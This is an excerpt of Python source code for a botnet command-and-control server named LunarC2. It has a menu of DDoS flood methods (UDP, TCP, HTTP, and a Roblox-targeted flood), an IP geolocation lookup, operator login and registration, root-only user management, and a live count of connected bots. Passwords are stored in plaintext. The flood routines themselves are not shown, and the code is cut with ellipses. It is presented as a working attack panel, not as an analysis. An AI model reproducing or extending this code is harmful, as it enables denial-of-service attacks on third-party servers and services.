...
help = f"""{red}HELP         {gray}Shows list of commands   
{red}METHODS      {gray}Shows list of methods      
{red}SERVERS      {gray}Shows available servers
{red}CLEAR        {gray}Clears the screen          
{red}EXIT         {gray}Disconnects from the net"""

methods = f"""{lightwhite}!udp               {gray}UDP Flood  
{red}!tcp               {gray}TCP Flood             
{red}!tup               {gray}Tcp and Udp Flood
{red}!roblox            {gray}Roblox Udp Flood
{red}!junk              {gray}Junk flood
{red}!hex               {gray}Hex Flood            
{red}!http_cfb          {gray}Http cfb Flood       
{red}!http_req          {gray}Http req Flood       
{red}!url_to_ip         {gray}Get Ip from URL      
{red}!ip_to_location    {gray}Get info from Ip"""

admin_methods = f"""{lightwhite}!register               {gray}Starts registration server
{red}!user               {gray}Add/remove users"""
...
def handle_client(client, address):
    send(client, f'\x1bLunarC2 | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
    ...
    while 1:
        send(client, ansi_clear, False)
        send(client, f'\x1b{red}Username :\x1b[0m ', False, False)
    ...
    password = ''
    while 1:
        send(client, f'\033{red}Password :\x1b[0;38;2;0;0;0m ', False, False)
        ...
        if choice == 'ADD':
            if len(args) == 4:
                ...
                with open('src/logins.txt', 'a') as logins:
                    logins.write(f'\n{user}:{password}')
                    logins.close()
                    send(client, f'{red}Added new user successfully.')
            else:
                ...
                with open("src/logins.txt", "w") as logins:
                    for line in lines:
                        if user not in line:
                            logins.write(line)
                    logins.close()
                send(client, f'{red}Removed user successfully!')
            else:
...
def update_title(client, name):
    while 1:
        try:
            send(client, f"\33]0;L | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Lu | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Lun | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Luna | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Lunar | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Lunar | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Luna | Running: {len(bots)} | Username: {name}\a", False)
...
def command_line(client, username):
    ...
    prompt = f'{red}LunarC2{color("LIGHTBLACK_EX")}@{red}{username}{color("LIGHTBLACK_EX")}]:~# {color("LIGHTBLACK_EX")}'
    ...
    while 1:
        try:
            ...
            if command == 'HELP':
                ...
                send(client, f'{red}Available servers: {len(bots)}.')
            elif command == '!ADMIN':
                if user_name == "root":
                ...
                if user_name == "root":
                    ...
                    send(client, f'{red}Started registration server.')
...
def register(client, address, send):
    ...
    try:
        ...
        p2 = ''
        while 1:
            send(client, f'\033{red}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p2.strip():
